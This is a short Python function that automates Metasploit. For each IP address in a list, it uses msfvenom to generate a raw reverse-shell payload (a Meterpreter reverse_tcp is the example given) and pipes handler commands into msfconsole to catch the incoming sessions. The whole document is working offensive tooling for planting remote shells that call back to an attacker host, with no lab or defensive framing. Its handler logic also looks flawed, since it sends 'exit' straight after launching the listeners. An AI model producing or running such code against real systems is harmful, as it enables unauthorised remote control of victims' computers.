def create_multihandler_payload(payload_type, lhost_list, lport, output_file_prefix):
    """
    Generates payloads using msfvenom and starts a Metasploit multi/handler for each lhost in the list.

    :param payload_type: The type of payload (e.g., windows/meterpreter/reverse_tcp)
    :param lhost_list: List of local host IPs for the payloads
    :param lport: Local port for the payloads
    :param output_file_prefix: Prefix for the generated payload files
    """
    import subprocess

    for idx, lhost in enumerate(lhost_list):
        output_file = f"{output_file_prefix}_{lhost.replace('.', '_')}.bin"
        
        # Generate payload
        try:
            print(f"Generating payload: {payload_type} LHOST={lhost} LPORT={lport}")
            cmd = [
                "msfvenom",
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", "raw",
                "-o", output_file
            ]
            subprocess.run(cmd, check=True)
            print(f"Payload saved to {output_file}")
        except subprocess.CalledProcessError as e:
            print(f"Error generating payload for {lhost}: {e}")
            continue

        # Start Metasploit multi/handler
        try:
            print(f"Starting Metasploit multi/handler for {lhost}...")
            msf_commands = f"""
use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
            process = subprocess.Popen(
                ["msfconsole", "-q"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            process.stdin.write(msf_commands)
            process.stdin.write("exit\n")
            process.stdin.flush()
            stdout, stderr = process.communicate()
            print(stdout)
            if stderr:
                print(f"Errors for {lhost}:\n{stderr}")
        except Exception as e:
            print(f"Failed to start multi/handler for {lhost}: {e}")
